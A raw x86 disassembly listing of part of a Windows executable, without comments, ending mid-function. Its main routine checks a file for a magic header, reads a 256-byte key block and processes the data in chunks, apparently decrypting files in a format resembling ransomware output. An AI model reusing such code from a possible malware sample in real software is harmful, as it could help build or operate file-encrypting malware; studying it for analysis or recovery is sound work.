  401e5c:	90                   	nop
  401e5d:	90                   	nop
  401e5e:	90                   	nop
  401e5f:	90                   	nop
  401e60:	db 44 24 04          	fildl  0x4(%esp)
  401e64:	8b 44 24 08          	mov    0x8(%esp),%eax
  401e68:	50                   	push   %eax
  401e69:	dc 0d b8 58 41 00    	fmull  0x4158b8
  401e6f:	83 ec 08             	sub    $0x8,%esp
  401e72:	dc 05 b0 58 41 00    	faddl  0x4158b0
  401e78:	dd 1c 24             	fstpl  (%esp)
  401e7b:	ff 15 c4 55 41 00    	call   *0x4155c4
  401e81:	c3                   	ret
  401e82:	90                   	nop
  401e83:	90                   	nop
  401e84:	90                   	nop
  401e85:	90                   	nop
  401e86:	90                   	nop
  401e87:	90                   	nop
  401e88:	90                   	nop
  401e89:	90                   	nop
  401e8a:	90                   	nop
  401e8b:	90                   	nop
  401e8c:	90                   	nop
  401e8d:	90                   	nop
  401e8e:	90                   	nop
  401e8f:	90                   	nop
  401e90:	6a ff                	push   $0xffffffff
  401e92:	68 06 35 41 00       	push   $0x413506
  401e97:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401e9d:	50                   	push   %eax
  401e9e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401ea5:	51                   	push   %ecx
  401ea6:	56                   	push   %esi
  401ea7:	8b f1                	mov    %ecx,%esi
  401ea9:	57                   	push   %edi
  401eaa:	89 74 24 08          	mov    %esi,0x8(%esp)
  401eae:	8d 4e 04             	lea    0x4(%esi),%ecx
  401eb1:	e8 8a 27 00 00       	call   0x404640
  401eb6:	33 ff                	xor    %edi,%edi
  401eb8:	8d 4e 2c             	lea    0x2c(%esi),%ecx
  401ebb:	89 7c 24 14          	mov    %edi,0x14(%esp)
  401ebf:	e8 7c 27 00 00       	call   0x404640
  401ec4:	8d 4e 54             	lea    0x54(%esi),%ecx
  401ec7:	c6 44 24 14 01       	movb   $0x1,0x14(%esp)
  401ecc:	e8 3f 82 00 00       	call   0x40a110
  401ed1:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  401ed5:	89 be c8 04 00 00    	mov    %edi,0x4c8(%esi)
  401edb:	89 be cc 04 00 00    	mov    %edi,0x4cc(%esi)
  401ee1:	89 be d0 04 00 00    	mov    %edi,0x4d0(%esi)
  401ee7:	89 be d4 04 00 00    	mov    %edi,0x4d4(%esi)
  401eed:	c7 06 c0 58 41 00    	movl   $0x4158c0,(%esi)
  401ef3:	8b c6                	mov    %esi,%eax
  401ef5:	5f                   	pop    %edi
  401ef6:	5e                   	pop    %esi
  401ef7:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401efe:	83 c4 10             	add    $0x10,%esp
  401f01:	c3                   	ret
  401f02:	90                   	nop
  401f03:	90                   	nop
  401f04:	90                   	nop
  401f05:	90                   	nop
  401f06:	90                   	nop
  401f07:	90                   	nop
  401f08:	90                   	nop
  401f09:	90                   	nop
  401f0a:	90                   	nop
  401f0b:	90                   	nop
  401f0c:	90                   	nop
  401f0d:	90                   	nop
  401f0e:	90                   	nop
  401f0f:	90                   	nop
  401f10:	56                   	push   %esi
  401f11:	8b f1                	mov    %ecx,%esi
  401f13:	e8 18 00 00 00       	call   0x401f30
  401f18:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  401f1d:	74 09                	je     0x401f28
  401f1f:	56                   	push   %esi
  401f20:	e8 73 0d 01 00       	call   0x412c98
  401f25:	83 c4 04             	add    $0x4,%esp
  401f28:	8b c6                	mov    %esi,%eax
  401f2a:	5e                   	pop    %esi
  401f2b:	c2 04 00             	ret    $0x4
  401f2e:	90                   	nop
  401f2f:	90                   	nop
  401f30:	6a ff                	push   $0xffffffff
  401f32:	68 31 35 41 00       	push   $0x413531
  401f37:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401f3d:	50                   	push   %eax
  401f3e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401f45:	51                   	push   %ecx
  401f46:	56                   	push   %esi
  401f47:	8b f1                	mov    %ecx,%esi
  401f49:	89 74 24 04          	mov    %esi,0x4(%esp)
  401f4d:	c7 06 c0 58 41 00    	movl   $0x4158c0,(%esi)
  401f53:	c7 44 24 10 02 00 00 	movl   $0x2,0x10(%esp)
  401f5a:	00 
  401f5b:	e8 40 00 00 00       	call   0x401fa0
  401f60:	8d 4e 54             	lea    0x54(%esi),%ecx
  401f63:	c6 44 24 10 01       	movb   $0x1,0x10(%esp)
  401f68:	e8 d3 81 00 00       	call   0x40a140
  401f6d:	8d 4e 2c             	lea    0x2c(%esi),%ecx
  401f70:	c6 44 24 10 00       	movb   $0x0,0x10(%esp)
  401f75:	e8 16 27 00 00       	call   0x404690
  401f7a:	8d 4e 04             	lea    0x4(%esi),%ecx
  401f7d:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  401f84:	ff 
  401f85:	e8 06 27 00 00       	call   0x404690
  401f8a:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401f8e:	5e                   	pop    %esi
  401f8f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401f96:	83 c4 10             	add    $0x10,%esp
  401f99:	c3                   	ret
  401f9a:	90                   	nop
  401f9b:	90                   	nop
  401f9c:	90                   	nop
  401f9d:	90                   	nop
  401f9e:	90                   	nop
  401f9f:	90                   	nop
  401fa0:	56                   	push   %esi
  401fa1:	8b f1                	mov    %ecx,%esi
  401fa3:	57                   	push   %edi
  401fa4:	8d 4e 04             	lea    0x4(%esi),%ecx
  401fa7:	e8 c4 27 00 00       	call   0x404770
  401fac:	8d 4e 2c             	lea    0x2c(%esi),%ecx
  401faf:	e8 bc 27 00 00       	call   0x404770
  401fb4:	8b 86 c8 04 00 00    	mov    0x4c8(%esi),%eax
  401fba:	8b 3d 84 50 41 00    	mov    0x415084,%edi
  401fc0:	85 c0                	test   %eax,%eax
  401fc2:	74 1f                	je     0x401fe3
  401fc4:	b9 00 00 10 00       	mov    $0x100000,%ecx
  401fc9:	c6 00 00             	movb   $0x0,(%eax)
  401fcc:	40                   	inc    %eax
  401fcd:	49                   	dec    %ecx
  401fce:	75 f9                	jne    0x401fc9
  401fd0:	8b 86 c8 04 00 00    	mov    0x4c8(%esi),%eax
  401fd6:	50                   	push   %eax
  401fd7:	ff d7                	call   *%edi
  401fd9:	c7 86 c8 04 00 00 00 	movl   $0x0,0x4c8(%esi)
  401fe0:	00 00 00 
  401fe3:	8b 86 cc 04 00 00    	mov    0x4cc(%esi),%eax
  401fe9:	85 c0                	test   %eax,%eax
  401feb:	74 1f                	je     0x40200c
  401fed:	b9 00 00 10 00       	mov    $0x100000,%ecx
  401ff2:	c6 00 00             	movb   $0x0,(%eax)
  401ff5:	40                   	inc    %eax
  401ff6:	49                   	dec    %ecx
  401ff7:	75 f9                	jne    0x401ff2
  401ff9:	8b 8e cc 04 00 00    	mov    0x4cc(%esi),%ecx
  401fff:	51                   	push   %ecx
  402000:	ff d7                	call   *%edi
  402002:	c7 86 cc 04 00 00 00 	movl   $0x0,0x4cc(%esi)
  402009:	00 00 00 
  40200c:	5f                   	pop    %edi
  40200d:	b8 01 00 00 00       	mov    $0x1,%eax
  402012:	5e                   	pop    %esi
  402013:	c3                   	ret
  402014:	90                   	nop
  402015:	90                   	nop
  402016:	90                   	nop
  402017:	90                   	nop
  402018:	90                   	nop
  402019:	90                   	nop
  40201a:	90                   	nop
  40201b:	90                   	nop
  40201c:	90                   	nop
  40201d:	90                   	nop
  40201e:	90                   	nop
  40201f:	90                   	nop
  402020:	56                   	push   %esi
  402021:	57                   	push   %edi
  402022:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  402026:	8b f1                	mov    %ecx,%esi
  402028:	57                   	push   %edi
  402029:	8d 4e 04             	lea    0x4(%esi),%ecx
  40202c:	e8 bf 26 00 00       	call   0x4046f0
  402031:	85 c0                	test   %eax,%eax
  402033:	75 05                	jne    0x40203a
  402035:	5f                   	pop    %edi
  402036:	5e                   	pop    %esi
  402037:	c2 0c 00             	ret    $0xc
  40203a:	85 ff                	test   %edi,%edi
  40203c:	74 0a                	je     0x402048
  40203e:	6a 00                	push   $0x0
  402040:	8d 4e 2c             	lea    0x2c(%esi),%ecx
  402043:	e8 a8 26 00 00       	call   0x4046f0
  402048:	8b 3d e0 50 41 00    	mov    0x4150e0,%edi
  40204e:	68 00 00 10 00       	push   $0x100000
  402053:	6a 00                	push   $0x0
  402055:	ff d7                	call   *%edi
  402057:	85 c0                	test   %eax,%eax
  402059:	89 86 c8 04 00 00    	mov    %eax,0x4c8(%esi)
  40205f:	75 05                	jne    0x402066
  402061:	5f                   	pop    %edi
  402062:	5e                   	pop    %esi
  402063:	c2 0c 00             	ret    $0xc
  402066:	68 00 00 10 00       	push   $0x100000
  40206b:	6a 00                	push   $0x0
  40206d:	ff d7                	call   *%edi
  40206f:	85 c0                	test   %eax,%eax
  402071:	89 86 cc 04 00 00    	mov    %eax,0x4cc(%esi)
  402077:	75 05                	jne    0x40207e
  402079:	5f                   	pop    %edi
  40207a:	5e                   	pop    %esi
  40207b:	c2 0c 00             	ret    $0xc
  40207e:	8b 44 24 10          	mov    0x10(%esp),%eax
  402082:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  402086:	89 86 d4 04 00 00    	mov    %eax,0x4d4(%esi)
  40208c:	89 8e d0 04 00 00    	mov    %ecx,0x4d0(%esi)
  402092:	5f                   	pop    %edi
  402093:	b8 01 00 00 00       	mov    $0x1,%eax
  402098:	5e                   	pop    %esi
  402099:	c2 0c 00             	ret    $0xc
  40209c:	90                   	nop
  40209d:	90                   	nop
  40209e:	90                   	nop
  40209f:	90                   	nop
  4020a0:	55                   	push   %ebp
  4020a1:	8b ec                	mov    %esp,%ebp
  4020a3:	6a ff                	push   $0xffffffff
  4020a5:	68 c8 58 41 00       	push   $0x4158c8
  4020aa:	68 50 30 41 00       	push   $0x413050
  4020af:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4020b5:	50                   	push   %eax
  4020b6:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4020bd:	81 ec 5c 02 00 00    	sub    $0x25c,%esp
  4020c3:	53                   	push   %ebx
  4020c4:	56                   	push   %esi
  4020c5:	57                   	push   %edi
  4020c6:	89 8d 94 fd ff ff    	mov    %ecx,-0x26c(%ebp)
  4020cc:	83 cf ff             	or     $0xffffffff,%edi
  4020cf:	89 bd 98 fd ff ff    	mov    %edi,-0x268(%ebp)
  4020d5:	89 bd a4 fd ff ff    	mov    %edi,-0x25c(%ebp)
  4020db:	33 f6                	xor    %esi,%esi
  4020dd:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  4020e0:	89 b5 9c fd ff ff    	mov    %esi,-0x264(%ebp)
  4020e6:	c6 85 c0 fd ff ff 00 	movb   $0x0,-0x240(%ebp)
  4020ed:	33 c0                	xor    %eax,%eax
  4020ef:	89 85 c1 fd ff ff    	mov    %eax,-0x23f(%ebp)
  4020f5:	66 89 85 c5 fd ff ff 	mov    %ax,-0x23b(%ebp)
  4020fc:	88 85 c7 fd ff ff    	mov    %al,-0x239(%ebp)
  402102:	89 b5 a0 fd ff ff    	mov    %esi,-0x260(%ebp)
  402108:	89 75 e0             	mov    %esi,-0x20(%ebp)
  40210b:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40210e:	89 b5 d0 fd ff ff    	mov    %esi,-0x230(%ebp)
  402114:	89 75 fc             	mov    %esi,-0x4(%ebp)
  402117:	56                   	push   %esi
  402118:	56                   	push   %esi
  402119:	6a 03                	push   $0x3
  40211b:	56                   	push   %esi
  40211c:	6a 01                	push   $0x1
  40211e:	68 00 00 00 80       	push   $0x80000000
  402123:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402126:	51                   	push   %ecx
  402127:	ff 15 a0 17 42 00    	call   *0x4217a0
  40212d:	8b d8                	mov    %eax,%ebx
  40212f:	89 9d 98 fd ff ff    	mov    %ebx,-0x268(%ebp)
  402135:	3b df                	cmp    %edi,%ebx
  402137:	75 0a                	jne    0x402143
  402139:	57                   	push   %edi
  40213a:	8d 55 f0             	lea    -0x10(%ebp),%edx
  40213d:	52                   	push   %edx
  40213e:	e9 0f 03 00 00       	jmp    0x402452
  402143:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
  402149:	50                   	push   %eax
  40214a:	8d 8d b0 fd ff ff    	lea    -0x250(%ebp),%ecx
  402150:	51                   	push   %ecx
  402151:	8d 95 a8 fd ff ff    	lea    -0x258(%ebp),%edx
  402157:	52                   	push   %edx
  402158:	53                   	push   %ebx
  402159:	ff 15 fc 50 41 00    	call   *0x4150fc
  40215f:	56                   	push   %esi
  402160:	8d 45 e0             	lea    -0x20(%ebp),%eax
  402163:	50                   	push   %eax
  402164:	6a 08                	push   $0x8
  402166:	8d 8d c0 fd ff ff    	lea    -0x240(%ebp),%ecx
  40216c:	51                   	push   %ecx
  40216d:	53                   	push   %ebx
  40216e:	ff 15 a8 17 42 00    	call   *0x4217a8
  402174:	85 c0                	test   %eax,%eax
  402176:	0f 84 d0 02 00 00    	je     0x40244c
  40217c:	b9 02 00 00 00       	mov    $0x2,%ecx
  402181:	bf e4 00 42 00       	mov    $0x4200e4,%edi
  402186:	8d b5 c0 fd ff ff    	lea    -0x240(%ebp),%esi
  40218c:	33 d2                	xor    %edx,%edx
  40218e:	f3 a7                	repz cmpsl %es:(%edi),%ds:(%esi)
  402190:	0f 85 b6 02 00 00    	jne    0x40244c
  402196:	52                   	push   %edx
  402197:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40219a:	50                   	push   %eax
  40219b:	6a 04                	push   $0x4
  40219d:	8d 8d 9c fd ff ff    	lea    -0x264(%ebp),%ecx
  4021a3:	51                   	push   %ecx
  4021a4:	53                   	push   %ebx
  4021a5:	ff 15 a8 17 42 00    	call   *0x4217a8
  4021ab:	85 c0                	test   %eax,%eax
  4021ad:	0f 84 99 02 00 00    	je     0x40244c
  4021b3:	81 bd 9c fd ff ff 00 	cmpl   $0x100,-0x264(%ebp)
  4021ba:	01 00 00 
  4021bd:	0f 85 89 02 00 00    	jne    0x40244c
  4021c3:	6a 00                	push   $0x0
  4021c5:	8d 55 e0             	lea    -0x20(%ebp),%edx
  4021c8:	52                   	push   %edx
  4021c9:	68 00 01 00 00       	push   $0x100
  4021ce:	8b b5 94 fd ff ff    	mov    -0x26c(%ebp),%esi
  4021d4:	8b 86 c8 04 00 00    	mov    0x4c8(%esi),%eax
  4021da:	50                   	push   %eax
  4021db:	53                   	push   %ebx
  4021dc:	ff 15 a8 17 42 00    	call   *0x4217a8
  4021e2:	85 c0                	test   %eax,%eax
  4021e4:	0f 84 62 02 00 00    	je     0x40244c
  4021ea:	6a 00                	push   $0x0
  4021ec:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4021ef:	51                   	push   %ecx
  4021f0:	6a 04                	push   $0x4
  4021f2:	8d 95 a0 fd ff ff    	lea    -0x260(%ebp),%edx
  4021f8:	52                   	push   %edx
  4021f9:	53                   	push   %ebx
  4021fa:	ff 15 a8 17 42 00    	call   *0x4217a8
  402200:	85 c0                	test   %eax,%eax
  402202:	0f 84 44 02 00 00    	je     0x40244c
  402208:	6a 00                	push   $0x0
  40220a:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40220d:	50                   	push   %eax
  40220e:	6a 08                	push   $0x8
  402210:	8d 8d c8 fd ff ff    	lea    -0x238(%ebp),%ecx
  402216:	51                   	push   %ecx
  402217:	53                   	push   %ebx
  402218:	ff 15 a8 17 42 00    	call   *0x4217a8
  40221e:	85 c0                	test   %eax,%eax
  402220:	0f 84 26 02 00 00    	je     0x40244c
  402226:	83 bd a0 fd ff ff 03 	cmpl   $0x3,-0x260(%ebp)
  40222d:	0f 85 c6 00 00 00    	jne    0x4022f9
  402233:	53                   	push   %ebx
  402234:	ff 15 b8 17 42 00    	call   *0x4217b8
  40223a:	6a 00                	push   $0x0
  40223c:	6a 00                	push   $0x0
  40223e:	6a 03                	push   $0x3
  402240:	6a 00                	push   $0x0
  402242:	6a 01                	push   $0x1
  402244:	68 00 00 00 c0       	push   $0xc0000000
  402249:	8b 55 08             	mov    0x8(%ebp),%edx
  40224c:	52                   	push   %edx
  40224d:	ff 15 a0 17 42 00    	call   *0x4217a0
  402253:	8b d8                	mov    %eax,%ebx
  402255:	89 9d 98 fd ff ff    	mov    %ebx,-0x268(%ebp)
  40225b:	83 fb ff             	cmp    $0xffffffff,%ebx
  40225e:	0f 84 e8 01 00 00    	je     0x40244c
  402264:	6a 02                	push   $0x2
  402266:	6a 00                	push   $0x0
  402268:	68 00 00 ff ff       	push   $0xffff0000
  40226d:	53                   	push   %ebx
  40226e:	8b 3d f8 50 41 00    	mov    0x4150f8,%edi
  402274:	ff d7                	call   *%edi
  402276:	6a 00                	push   $0x0
  402278:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40227b:	51                   	push   %ecx
  40227c:	68 00 00 01 00       	push   $0x10000
  402281:	8b 96 c8 04 00 00    	mov    0x4c8(%esi),%edx
  402287:	52                   	push   %edx
  402288:	53                   	push   %ebx
  402289:	ff 15 a8 17 42 00    	call   *0x4217a8
  40228f:	85 c0                	test   %eax,%eax
  402291:	0f 84 b5 01 00 00    	je     0x40244c
  402297:	81 7d e0 00 00 01 00 	cmpl   $0x10000,-0x20(%ebp)
  40229e:	0f 85 a8 01 00 00    	jne    0x40244c
  4022a4:	6a 00                	push   $0x0
  4022a6:	6a 00                	push   $0x0
  4022a8:	6a 00                	push   $0x0
  4022aa:	53                   	push   %ebx
  4022ab:	ff d7                	call   *%edi
  4022ad:	6a 00                	push   $0x0
  4022af:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4022b2:	50                   	push   %eax
  4022b3:	68 00 00 01 00       	push   $0x10000
  4022b8:	8b 8e c8 04 00 00    	mov    0x4c8(%esi),%ecx
  4022be:	51                   	push   %ecx
  4022bf:	53                   	push   %ebx
  4022c0:	ff 15 a4 17 42 00    	call   *0x4217a4
  4022c6:	85 c0                	test   %eax,%eax
  4022c8:	0f 84 a8 00 00 00    	je     0x402376
  4022ce:	81 7d e4 00 00 01 00 	cmpl   $0x10000,-0x1c(%ebp)
  4022d5:	0f 85 9b 00 00 00    	jne    0x402376
  4022db:	6a 02                	push   $0x2
  4022dd:	6a 00                	push   $0x0
  4022df:	68 00 00 ff ff       	push   $0xffff0000
  4022e4:	53                   	push   %ebx
  4022e5:	ff d7                	call   *%edi
  4022e7:	53                   	push   %ebx
  4022e8:	ff 15 f4 50 41 00    	call   *0x4150f4
  4022ee:	8b bd a4 fd ff ff    	mov    -0x25c(%ebp),%edi
  4022f4:	e9 9e 01 00 00       	jmp    0x402497
  4022f9:	6a 00                	push   $0x0
  4022fb:	68 80 00 00 00       	push   $0x80
  402300:	6a 02                	push   $0x2
  402302:	6a 00                	push   $0x0
  402304:	6a 01                	push   $0x1
  402306:	68 00 00 00 40       	push   $0x40000000
  40230b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40230e:	51                   	push   %ecx
  40230f:	ff 15 a0 17 42 00    	call   *0x4217a0
  402315:	8b f8                	mov    %eax,%edi
  402317:	89 bd a4 fd ff ff    	mov    %edi,-0x25c(%ebp)
  40231d:	83 ff ff             	cmp    $0xffffffff,%edi
  402320:	75 0a                	jne    0x40232c
  402322:	50                   	push   %eax
  402323:	8d 55 f0             	lea    -0x10(%ebp),%edx
  402326:	52                   	push   %edx
  402327:	e9 26 01 00 00       	jmp    0x402452
  40232c:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40232f:	50                   	push   %eax
  402330:	8d 8d d4 fd ff ff    	lea    -0x22c(%ebp),%ecx
  402336:	51                   	push   %ecx
  402337:	8b 95 9c fd ff ff    	mov    -0x264(%ebp),%edx
  40233d:	52                   	push   %edx
  40233e:	8b 86 c8 04 00 00    	mov    0x4c8(%esi),%eax
  402344:	50                   	push   %eax
  402345:	8d 4e 04             	lea    0x4(%esi),%ecx
  402348:	e8 a3 27 00 00       	call   0x404af0
  40234d:	85 c0                	test   %eax,%eax
  40234f:	75 3a                	jne    0x40238b
  402351:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  402354:	51                   	push   %ecx
  402355:	8d 95 d4 fd ff ff    	lea    -0x22c(%ebp),%edx
  40235b:	52                   	push   %edx
  40235c:	8b 85 9c fd ff ff    	mov    -0x264(%ebp),%eax
  402362:	50                   	push   %eax
  402363:	8b 8e c8 04 00 00    	mov    0x4c8(%esi),%ecx
  402369:	51                   	push   %ecx
  40236a:	8d 4e 2c             	lea    0x2c(%esi),%ecx
  40236d:	e8 7e 27 00 00       	call   0x404af0
  402372:	85 c0                	test   %eax,%eax
  402374:	75 0b                	jne    0x402381
  402376:	6a ff                	push   $0xffffffff
  402378:	8d 55 f0             	lea    -0x10(%ebp),%edx
  40237b:	52                   	push   %edx
  40237c:	e9 d1 00 00 00       	jmp    0x402452
  402381:	c7 85 d0 fd ff ff 01 	movl   $0x1,-0x230(%ebp)
  402388:	00 00 00 
  40238b:	8d 4e 54             	lea    0x54(%esi),%ecx
  40238e:	6a 10                	push   $0x10
  402390:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  402393:	50                   	push   %eax
  402394:	8b 15 b0 13 42 00    	mov    0x4213b0,%edx
  40239a:	52                   	push   %edx
  40239b:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  4023a1:	50                   	push   %eax
  4023a2:	e8 a9 7d 00 00       	call   0x40a150
  4023a7:	8b 8d c8 fd ff ff    	mov    -0x238(%ebp),%ecx
  4023ad:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  4023b0:	8b 95 cc fd ff ff    	mov    -0x234(%ebp),%edx
  4023b6:	89 55 dc             	mov    %edx,-0x24(%ebp)
  4023b9:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4023bc:	85 c0                	test   %eax,%eax
  4023be:	0f 8c b3 00 00 00    	jl     0x402477
  4023c4:	7f 0b                	jg     0x4023d1
  4023c6:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4023c9:	85 c0                	test   %eax,%eax
  4023cb:	0f 86 a6 00 00 00    	jbe    0x402477
  4023d1:	8b 86 d0 04 00 00    	mov    0x4d0(%esi),%eax
  4023d7:	85 c0                	test   %eax,%eax
  4023d9:	74 05                	je     0x4023e0
  4023db:	83 38 00             	cmpl   $0x0,(%eax)
  4023de:	75 6c                	jne    0x40244c
  4023e0:	6a 00                	push   $0x0
  4023e2:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4023e5:	51                   	push   %ecx
  4023e6:	68 00 00 10 00       	push   $0x100000
  4023eb:	8b 96 c8 04 00 00    	mov    0x4c8(%esi),%edx
  4023f1:	52                   	push   %edx
  4023f2:	53                   	push   %ebx
  4023f3:	ff 15 a8 17 42 00    	call   *0x4217a8
  4023f9:	85 c0                	test   %eax,%eax
  4023fb:	74 72                	je     0x40246f
  4023fd:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402400:	85 c0                	test   %eax,%eax
  402402:	74 6b                	je     0x40246f
  402404:	29 45 d8             	sub    %eax,-0x28(%ebp)
  402407:	83 5d dc 00          	sbbl   $0x0,-0x24(%ebp)
  40240b:	6a 01                	push   $0x1
  40240d:	50                   	push   %eax
  40240e:	8b 86 cc 04 00 00    	mov    0x4cc(%esi),%eax
  402414:	50                   	push   %eax
  402415:	8b 8e c8 04 00 00    	mov    0x4c8(%esi),%ecx
  40241b:	51                   	push   %ecx
  40241c:	8d 4e 54             	lea    0x54(%esi),%ecx
  40241f:	e8 9c 8f 00 00       	call   0x40b3c0
  402424:	6a 00                	push   $0x0
  402426:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  402429:	52                   	push   %edx
  40242a:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40242d:	50                   	push   %eax
  40242e:	8b 8e cc 04 00 00    	mov    0x4cc(%esi),%ecx
  402434:	51                   	push   %ecx
  402435:	57                   	push   %edi
  402436:	ff 15 a4 17 42 00    	call   *0x4217a4
  40243c:	85 c0                	test   %eax,%eax
  40243e:	74 0c                	je     0x40244c
  402440:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  402443:	3b 55 e0             	cmp    -0x20(%ebp),%edx
  402446:	0f 84 6d ff ff ff    	je     0x4023b9
  40244c:	6a ff                	push   $0xffffffff
  40244e:	8d 45 f0             	lea    -0x10(%ebp),%eax
  402451:	50                   	push   %eax
  402452:	e8 ff 0b 01 00       	call   0x413056
  402457:	83 c4 08             	add    $0x8,%esp
  40245a:	33 c0                	xor    %eax,%eax
  40245c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40245f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402466:	5f                   	pop    %edi
  402467:	5e                   	pop    %esi
  402468:	5b                   	pop    %ebx
  402469:	8b e5                	mov    %ebp,%esp
  40246b:	5d                   	pop    %ebp
  40246c:	c2 08 00             	ret    $0x8
  40246f:	6a ff                	push   $0xffffffff
  402471:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402474:	51                   	push   %ecx
  402475:	eb db                	jmp    0x402452
  402477:	6a 00                	push   $0x0
  402479:	6a 00                	push   $0x0
  40247b:	8b 95 cc fd ff ff    	mov    -0x234(%ebp),%edx
  402481:	52                   	push   %edx
  402482:	8b 85 c8 fd ff ff    	mov    -0x238(%ebp),%eax
  402488:	50                   	push   %eax
  402489:	57                   	push   %edi
  40248a:	ff 15 f0 50 41 00    	call   *0x4150f0
  402490:	57                   	push   %edi
  402491:	ff 15 f4 50 41 00    	call   *0x4150f4
  402497:	8d 8d b8 fd ff ff    	lea    -0x248(%ebp),%ecx
  40249d:	51                   	push   %ecx
  40249e:	8d 95 b0 fd ff ff    	lea    -0x250(%ebp),%edx
  4024a4:	52                   	push   %edx
  4024a5:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  4024ab:	50                   	push   %eax
  4024ac:	57                   	push   %edi
  4024ad:	ff 15 ec 50 41 00    	call   *0x4150ec
  4024b3:	83 bd a0 fd ff ff 03 	cmpl   $0x3,-0x260(%ebp)
  4024ba:	75 24                	jne    0x4024e0
  4024bc:	53                   	push   %ebx
  4024bd:	ff 15 b8 17 42 00    	call   *0x4217b8
  4024c3:	83 c8 ff             	or     $0xffffffff,%eax
  4024c6:	89 85 a4 fd ff ff    	mov    %eax,-0x25c(%ebp)
  4024cc:	89 85 98 fd ff ff    	mov    %eax,-0x268(%ebp)
  4024d2:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4024d5:	51                   	push   %ecx
  4024d6:	8b 55 08             	mov    0x8(%ebp),%edx
  4024d9:	52                   	push   %edx
  4024da:	ff 15 ac 17 42 00    	call   *0x4217ac
  4024e0:	8b b6 d4 04 00 00    	mov    0x4d4(%esi),%esi
  4024e6:	85 f6                	test   %esi,%esi
  4024e8:	74 21                	je     0x40250b
  4024ea:	8b 85 d0 fd ff ff    	mov    -0x230(%ebp),%eax
  4024f0:	50                   	push   %eax
  4024f1:	6a 00                	push   $0x0
  4024f3:	8b 8d c8 fd ff ff    	mov    -0x238(%ebp),%ecx
  4024f9:	51                   	push   %ecx
  4024fa:	8b 95 cc fd ff ff    	mov    -0x234(%ebp),%edx
  402500:	52                   	push   %edx
  402501:	8b 45 0c             	mov    0xc(%ebp),%eax
  402504:	50                   	push   %eax
  402505:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402508:	51                   	push   %ecx
  402509:	ff d6                	call   *%esi
  40250b:	6a ff                	push   $0xffffffff
  40250d:	8d 55 f0             	lea    -0x10(%ebp),%edx
  402510:	52                   	push   %edx
  402511:	e8 40 0b 01 00       	call   0x413056
  402516:	83 c4 08             	add    $0x8,%esp
  402519:	b8 01 00 00 00       	mov    $0x1,%eax
  40251e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  402521:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402528:	5f                   	pop    %edi
  402529:	5e                   	pop    %esi
  40252a:	5b                   	pop    %ebx
  40252b:	8b e5                	mov    %ebp,%esp
  40252d:	5d                   	pop    %ebp
  40252e:	c2 08 00             	ret    $0x8
  402531:	8b 85 98 fd ff ff    	mov    -0x268(%ebp),%eax
  402537:	83 f8 ff             	cmp    $0xffffffff,%eax
  40253a:	74 07                	je     0x402543
  40253c:	50                   	push   %eax
  40253d:	ff 15 b8 17 42 00    	call   *0x4217b8
  402543:	8b 85 a4 fd ff ff    	mov    -0x25c(%ebp),%eax
  402549:	83 f8 ff             	cmp    $0xffffffff,%eax
  40254c:	74 07                	je     0x402555
  40254e:	50                   	push   %eax
  40254f:	ff 15 b8 17 42 00    	call   *0x4217b8
  402555:	c3                   	ret
  402556:	90                   	nop
  402557:	90                   	nop
  402558:	90                   	nop
  402559:	90                   	nop
  40255a:	90                   	nop
  40255b:	90                   	nop
  40255c:	90                   	nop
  40255d:	90                   	nop
  40255e:	90                   	nop
  40255f:	90                   	nop
  402560:	81 ec d4 02 00 00    	sub    $0x2d4,%esp
  402566:	53                   	push   %ebx
  402567:	8b 9c 24 dc 02 00 00 	mov    0x2dc(%esp),%ebx
  40256e:	55                   	push   %ebp
  40256f:	56                   	push   %esi
  402570:	57                   	push   %edi
  402571:	8d 44 24 14          	lea    0x14(%esp),%eax
  402575:	53                   	push   %ebx
  402576:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  40257a:	50                   	push   %eax
  40257b:	33 ff                	xor    %edi,%edi
  40257d:	ff 15 50 55 41 00    	call   *0x415550
  402583:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  402587:	6a 2e                	push   $0x2e
  402589:	51                   	push   %ecx
  40258a:	ff 15 68 55 41 00    	call   *0x415568
